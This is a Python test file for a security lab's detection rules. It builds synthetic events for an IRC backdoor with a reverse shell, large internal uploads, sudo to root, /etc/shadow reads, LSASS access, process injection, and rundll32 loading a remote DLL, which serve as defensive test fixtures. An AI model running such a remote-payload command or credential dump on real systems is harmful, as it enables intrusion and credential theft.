"""Regression tests for the detection rules added during the lab experiments."""
import json

from common.models import NormalizedEvent
from detection.host_rules import detect_host
from detection.network_rules import detect_network

TASK = "task_rules_test"


def event(action, **kwargs):
    payload = dict(
        event_id=kwargs.pop("event_id"),
        task_id=TASK,
        timestamp=kwargs.pop("timestamp"),
        source_type=kwargs.pop("source_type", "host_behavior"),
        source=kwargs.pop("source", "bpftrace"),
        action=action,
        raw_event={"raw": "test"},
    )
    payload.update(kwargs)
    return NormalizedEvent(**payload)


def zeek_conn(src, dst, dst_port, timestamp, out_bytes, in_bytes, event_id):
    return event("network_connect", event_id=event_id, timestamp=timestamp,
                 source_type="network_flow", source="zeek", src_ip=src, dst_ip=dst,
                 src_port=40000, dst_port=dst_port,
                 network={"protocol": "tcp", "bytes_out": out_bytes, "bytes_in": in_bytes},
                 metadata={"zeek": {}})


def zeek_irc(src, dst, timestamp, command, value, event_id):
    return event("irc_command", event_id=event_id, timestamp=timestamp,
                 source_type="network_flow", source="zeek", src_ip=src, dst_ip=dst,
                 src_port=40000, dst_port=6667,
                 network={"protocol": "tcp"},
                 metadata={"zeek": {"command": command, "value": value}})


def test_irc_backdoor_requires_automation_and_a_reverse_connection():
    rows = [zeek_irc("192.168.56.10", "192.168.56.30", f"2026-09-10T17:1{i}:00+00:00",
                     "NICK", f"nick{i}", f"evt_irc_{i}") for i in range(5)]
    rows += [zeek_irc("192.168.56.10", "192.168.56.30", f"2026-09-10T17:1{i}:10+00:00",
                      "USER", f"nick{i}", f"evt_ircu_{i}") for i in range(5)]

    # Without a reverse connection the pattern stays a candidate only.
    assert [a.rule_id for a in detect_network(rows)] == []

    rows.append(zeek_conn("192.168.56.30", "192.168.56.10", 4444,
                          "2026-09-10T17:16:28+00:00", 4684, 23, "evt_rev"))
    alerts = detect_network(rows)
    assert [a.rule_id for a in alerts] == ["NET-IRC-BACKDOOR-EXPLOIT"]
    assert alerts[0].tactic if hasattr(alerts[0], "tactic") else True


def test_internal_upload_rule_ignores_small_and_balanced_traffic():
    small = [zeek_conn("192.168.56.60", "192.168.56.40", 8080,
                       f"2026-09-10T18:0{i}:00+00:00", 600, 470, f"evt_small_{i}") for i in range(4)]
    assert [a.rule_id for a in detect_network(small)] == []

    large = [zeek_conn("192.168.56.60", "192.168.56.40", 8080,
                       f"2026-09-10T18:0{i}:00+00:00", 60000, 500, f"evt_large_{i}") for i in range(4)]
    assert [a.rule_id for a in detect_network(large)] == ["NET-INTERNAL-SENSITIVE-UPLOAD"]


def test_internal_ssh_login_and_sudo_to_root_rules():
    login = event("login_success", event_id="evt_login", timestamp="2026-09-10T17:37:56+00:00",
                  source_type="host_log", source="auth.log", host_id="legacycore01",
                  src_ip="192.168.56.30", user="msfadmin",
                  metadata={"os": "linux", "session_id": "s1"})
    external = event("login_success", event_id="evt_login_ext", timestamp="2026-09-10T17:20:00+00:00",
                     source_type="host_log", source="auth.log", host_id="legacyweb01",
                     src_ip="192.168.56.10", user="root", metadata={"os": "linux"})
    sudo = event("sudo_exec", event_id="evt_sudo", timestamp="2026-09-10T17:37:57+00:00",
                 source_type="host_log", source="auth.log", host_id="legacycore01",
                 user="msfadmin", metadata={"os": "linux", "target_user": "root",
                                            "session_id": "s1"})
    alerts = detect_host([login, external, sudo])
    rules = sorted({a.rule_id for a in alerts})
    assert rules == ["HOST-LINUX-INTERNAL-SSH-LOGIN", "HOST-LINUX-SUDO-TO-ROOT"]


def test_operator_accounts_do_not_become_attack_candidates():
    """The lab's own forensics logins must not look like the intruder."""
    attacker_login = event("login_success", event_id="evt_atk_login",
                           timestamp="2026-09-11T05:05:12+00:00", source_type="host_log",
                           source="auth.log", host_id="legacycore01", src_ip="192.168.56.30",
                           user="msfadmin", metadata={"os": "linux"})
    operator_login = event("login_success", event_id="evt_op_login",
                           timestamp="2026-09-11T05:10:00+00:00", source_type="host_log",
                           source="auth.log", host_id="legacycore01", src_ip="192.168.56.30",
                           user="labforensics", metadata={"os": "linux"})
    attacker_sudo = event("sudo_exec", event_id="evt_atk_sudo",
                          timestamp="2026-09-11T05:05:13+00:00", source_type="host_log",
                          source="auth.log", host_id="legacycore01", user="msfadmin",
                          metadata={"os": "linux", "target_user": "root"})
    operator_sudo = event("sudo_exec", event_id="evt_op_sudo",
                          timestamp="2026-09-11T05:10:01+00:00", source_type="host_log",
                          source="auth.log", host_id="legacycore01", user="labforensics",
                          metadata={"os": "linux", "target_user": "root"})

    alerts = detect_host([attacker_login, operator_login, attacker_sudo, operator_sudo])
    by_rule = {alert.rule_id: alert for alert in alerts}
    assert sorted(by_rule) == ["HOST-LINUX-INTERNAL-SSH-LOGIN", "HOST-LINUX-SUDO-TO-ROOT"]
    for alert in by_rule.values():
        assert "evt_op_login" not in alert.event_ids
        assert "evt_op_sudo" not in alert.event_ids
        assert "labforensics" in alert.evidence_summary
    assert "evt_atk_login" in by_rule["HOST-LINUX-INTERNAL-SSH-LOGIN"].event_ids
    assert "evt_atk_sudo" in by_rule["HOST-LINUX-SUDO-TO-ROOT"].event_ids


def test_sensitive_file_access_ignores_ssh_key_probing():
    real = event("file_access", event_id="evt_shadow", timestamp="2026-09-10T18:10:00+00:00",
                 host_id="webserver01", object={"type": "file", "name": "shadow",
                                                "path": "/etc/shadow"},
                 metadata={"os": "linux", "syscall": "openat"})
    noise = event("file_access", event_id="evt_probe", timestamp="2026-09-10T18:10:01+00:00",
                  host_id="webserver01", object={"type": "file", "name": "id_rsa",
                                                 "path": "/root/.ssh/id_rsa"},
                  metadata={"os": "linux", "syscall": "openat"})
    alerts = detect_host([real, noise])
    assert [a.rule_id for a in alerts] == ["HOST-LINUX-SENSITIVE-FILE-ACCESS"]
    assert "/etc/shadow" in alerts[0].evidence_summary


def test_windows_injection_and_lsass_rules():
    thread = event("remote_thread_create", event_id="evt_th", timestamp="2026-09-10T18:41:35+00:00",
                   source="sysmon", host_id="coreserver01",
                   metadata={"os": "windows", "source_image": r"C:\pwsh.exe",
                             "target_image": r"C:\notepad.exe"})
    access = event("process_access", event_id="evt_pa", timestamp="2026-09-10T18:41:35.8+00:00",
                   source="sysmon", host_id="coreserver01",
                   metadata={"os": "windows", "source_image": r"C:\pwsh.exe",
                             "target_image": r"C:\notepad.exe",
                             "granted_access_value": 0x1F3FFF, "write_capable": True})
    lsass = event("process_access", event_id="evt_lsass", timestamp="2026-09-10T18:42:00+00:00",
                  source="sysmon", host_id="coreserver01",
                  metadata={"os": "windows", "source_image": r"C:\tools\dumper.exe",
                            "target_image": r"C:\Windows\System32\lsass.exe",
                            "granted_access_value": 0x1010, "write_capable": False})
    benign = event("process_access", event_id="evt_av", timestamp="2026-09-10T18:42:01+00:00",
                   source="sysmon", host_id="coreserver01",
                   metadata={"os": "windows", "source_image": r"C:\MsMpEng.exe",
                             "target_image": r"C:\Windows\System32\lsass.exe",
                             "granted_access_value": 0x1000, "write_capable": False})
    rules = sorted({a.rule_id for a in detect_host([thread, access, lsass, benign])})
    assert rules == ["HOST-WIN-LSASS-MEMORY-ACCESS", "HOST-WIN-PROCESS-INJECTION"]


def test_unbacked_remote_thread_is_flagged_as_injection_or_reflective_loading():
    # Sysmon writes "-" when the thread start address has no backing module.
    thread = event("remote_thread_create", event_id="evt_unbacked",
                   timestamp="2026-09-10T18:41:35+00:00", source="sysmon", host_id="coreserver01",
                   metadata={"os": "windows", "source_image": r"C:\pwsh.exe",
                             "target_image": r"C:\notepad.exe", "start_module": "-",
                             "start_address": "0x000001D4C3000000"})
    alerts = detect_host([thread])
    assert [a.rule_id for a in alerts] == ["HOST-WIN-PROCESS-INJECTION"]
    evidence = json.loads(alerts[0].evidence_summary)
    assert evidence["unbacked_thread_events"] == 1
    assert evidence["reflective_or_injected_code_indicator"] is True
    assert alerts[0].confidence > 0.85


def test_lolbin_rule_matches_remote_payload_only():
    suspicious = event("process_create", event_id="evt_lolbin",
                       timestamp="2026-09-10T18:50:00+00:00", source="sysmon",
                       process={"name": "rundll32.exe", "path": r"C:\Windows\System32\rundll32.exe"},
                       metadata={"os": "windows",
                                 "command_line": "rundll32.exe http://203.0.113.9/payload.dll,Entry",
                                 "image": r"C:\Windows\System32\rundll32.exe"})
    benign = event("process_create", event_id="evt_lolbin_ok",
                   timestamp="2026-09-10T18:51:00+00:00", source="sysmon",
                   process={"name": "rundll32.exe", "path": r"C:\Windows\System32\rundll32.exe"},
                   metadata={"os": "windows", "command_line": "rundll32.exe shell32.dll,Control_RunDLL",
                             "image": r"C:\Windows\System32\rundll32.exe"})
    alerts = detect_host([suspicious, benign])
    assert [a.rule_id for a in alerts] == ["HOST-WIN-LOLBIN-EXECUTION"]
